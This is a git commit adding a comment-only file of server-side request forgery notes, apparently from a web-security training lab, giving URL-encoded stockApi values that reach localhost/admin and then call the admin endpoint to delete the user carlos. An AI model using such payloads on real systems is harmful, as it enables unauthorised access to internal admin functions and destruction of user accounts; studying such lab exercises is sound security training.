36162972d65683b016d2cdef5c0a7d939d5e54f4
Pranjal <pranjalruhela2811@gmail.com>
2023-07-02 18:04:45 +0530

    endpoint game

---
+++ SSRF/payload.js
@@ -0,0 +1,9 @@
+/*
+intercept the check stock function request
+enter this in the stockApi paramter value in the POST /product/stock request
+    stockApi=http%3A%2F%2Flocalhost%2Fadmin
+
+The HTML reveals the URL to delete the user carlos
+<a href="/admin/delete?username=carlos">Delete
+    stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
+*/
